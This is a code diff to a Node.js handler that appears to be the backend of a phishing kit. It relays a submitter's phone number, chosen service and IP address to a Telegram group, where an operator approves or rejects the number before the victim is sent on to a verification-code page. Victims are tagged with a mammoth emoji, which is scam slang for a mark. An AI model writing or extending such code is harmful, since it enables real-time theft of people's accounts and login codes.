@@ -1,9 +1,11 @@
+const { json } = require('body-parser');
 const {bot, groupID} = require('../index');
 
 const sendRequest = async (req, res) => {
     const {number, service} = req.body;
     const ip = req.ip || req.connection.remoteAddress;
     const keyboard = {
+        parse_mode: 'Markdown',
         reply_markup: {
             inline_keyboard: [
               [
@@ -14,26 +16,32 @@ const sendRequest = async (req, res) => {
           }
       };
     bot.sendMessage(groupID,
-`IP заявки: ${ip}
-Сервис: ${service}
-Номер телефона для входа: ${number}`,
+`🦣 ${ip} 🦣
+
+📱 Подтверждение номера 📱
+
+🔄 Выберете действие 🔄
+
+»»»       Сервис: ${service}       «««
+
+»»»       ` +'`' + number + '`' + '       «««',
  keyboard);
  bot.once('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
   
     if (data === 'correct') {
         bot.sendMessage(groupID, `
-IP заявки: ${ip}
-Номер верный, перенаправление на код`);
+🦣  ${ip}  🦣
+✅Перенаправлен на код✅`);
         bot.answerCallbackQuery(callbackQuery.id);
-        return res.send('correct');
+        return res.send({res: true});
     }
     if (data === 'incorrect') {
         bot.sendMessage(groupID, `
-IP заявки: ${ip}
-Номер не верный, перенаправление на повторную форму`);
+🦣  ${ip}  🦣
+❌Сообщение о неверном номере❌`);
         bot.answerCallbackQuery(callbackQuery.id);
-        return res.send('incorrect');
+        return res.send({res: false});
     }
 });
 }
